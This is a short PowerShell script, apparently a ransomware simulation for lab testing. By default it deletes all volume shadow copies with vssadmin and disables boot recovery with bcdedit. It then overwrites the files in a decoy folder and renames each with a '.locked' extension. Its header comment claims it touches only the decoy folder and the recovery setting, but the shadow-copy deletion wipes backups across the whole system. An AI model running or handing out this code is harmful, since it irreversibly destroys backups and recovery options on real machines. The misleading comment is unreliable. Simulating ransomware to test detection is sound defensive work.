# ransom-sim.ps1 - lab only. Touches only the decoy folder and the boot recovery setting.
param([switch]$SkipInhibit)
$decoy = 'C:\Users\Public\Documents\00_Finance_Backup'

if (-not $SkipInhibit) {
    vssadmin.exe delete shadows /all /quiet
    bcdedit.exe /set '{default}' recoveryenabled no
    Start-Sleep -Seconds 15
}

Get-ChildItem $decoy -File | ForEach-Object {
    Set-Content -Path $_.FullName -Value ('modified ' * 100)
    Rename-Item -Path $_.FullName -NewName ($_.Name + '.locked')
}
